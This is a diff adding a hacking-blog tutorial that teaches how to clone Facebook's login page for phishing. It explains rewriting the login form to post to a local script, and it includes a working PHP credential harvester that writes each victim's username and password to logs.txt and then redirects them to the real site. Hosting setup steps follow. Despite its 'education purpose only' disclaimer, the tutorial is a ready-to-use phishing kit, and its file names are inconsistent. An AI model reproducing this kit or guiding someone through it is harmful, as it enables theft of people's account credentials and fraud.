@@ -1,0 +1,74 @@
+This Tutorial is for Education Purpose only!!!
+
+    Phishing is a technique by which we create a similar web page(Phishing Page) to the original one. In this technique, we copy original website page code and do some changes to it. Then upload it to the hosting and access it from anywhere.
+
+Here is the list of things that you will learn from this post
+
+    How to copy the code from the original website
+    How to do some changes in this code
+    How to make a php script
+    How to upload it to the Hosting
+    and a lot more !!!
+
+
+How to copy the code from the original website
+
+Open a website of which Phishing page do you want then press ctrl+U to open its source code file. For ex:- I’m copying the code of Facebook.com and then I will make a facebook phishing page. Well, this is what which you want …Right!! 😛
+
+So I’m copying the source code from Fcaebook.com by pressing ctrl+U. You can see here the source code from Facebook.com is shown here.
+
+
+How to do some changes in this code?
+
+Now, you have to find this line by pressing ctrl+F and type this whole line there and press Enter.
+
+    action=”https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110″ method=”post”
+    
+    
+Let’s do some changes, You can see the path of Facebook is shown here. Copy this whole path and replace it with login.php and also change the method from post to get. and save this notepad file with the name fb.html.
+
+
+How to make a php script?
+
+Do you know Php Language? Well, If you don’t know anything about Php Language then no problem but in the future, I recommend you to learn this language. So, I’m giving you a PHP code which will save the username password which is entered on our fb.html page. and it also saves different username and password to a new line. When the victim enters his username and password to it then this PHP script will redirect that user to the original Facebook page.
+
+So, here’s the Php script
+
+
+<?php
+header(“Location: https://www.facebook.com”);
+$handle = fopen(“logs.txt”, “a”);
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, “=”);
+fwrite($handle, $value);
+fwrite($handle, “\r\n”);
+}
+fwrite($handle, “\r\n”);
+fclose($handle);
+exit;
+?>
+
+
+Just copy this script and paste it down to your notepad file and then save this file with a name hack.php
+
+One more thing creates a blank notepad file with a logs.txt name on which victim’s usernames and password will save.
+
+Now, you have three notepad files one is none.html and second is login.php and third is logs.txt. Just copy all files and save it to a new folder.
+
+
+How to upload Facebook Phishing Page to the Hosting?
+
+Let Understand what is Hosting and Domain. To open a website we must have a domain, hosting. So, Domain is the name of our website. For ex :- I have Hackingblogs.com This is my domain. and the location where this domain has parked this location is known as hosting.
+
+Still Confused!! Let’s Understand with an Example, Whenever we open a new store then we have to decide  two things
+
+    Store’s Name
+    Land/room 
+
+Similarly, For opening a website we need Domain for a website which is unique. and the second one is the land which is hosting on the Internet. Hosting and Domain are paid and some websites also provide this hosting and domain at free of cost.
+
+Here’s the list of Free hosting providers website.
+
+
+https://hackingblogs.com/phishing-page-2/
